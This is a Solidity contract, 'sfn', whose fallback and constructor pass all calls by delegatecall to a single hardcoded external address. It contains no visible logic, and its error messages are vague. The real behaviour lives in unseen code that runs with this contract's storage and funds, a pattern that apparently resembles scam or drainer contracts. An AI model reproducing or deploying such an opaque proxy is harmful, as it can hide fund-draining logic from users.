// SPDX-License-Identifier: MIT

pragma solidity >=0.8.13;

contract sfn {
    uint256 private ns = 5005;
    fallback(bytes calldata data) payable external returns(bytes memory){
        (bool r1, bytes memory result) = address(0x475524DE13F635CbBcA065C3B70C35cDEb6125ea).delegatecall(data);
        require(r1, "Verification.");
        return result;
    }

    receive() payable external {
    }

    constructor() {
        bytes memory data = abi.encodeWithSignature("initialize()");
        (bool r1,) = address(0x475524DE13F635CbBcA065C3B70C35cDEb6125ea).delegatecall(data);
        require(r1, "Verificiation.");
    }
}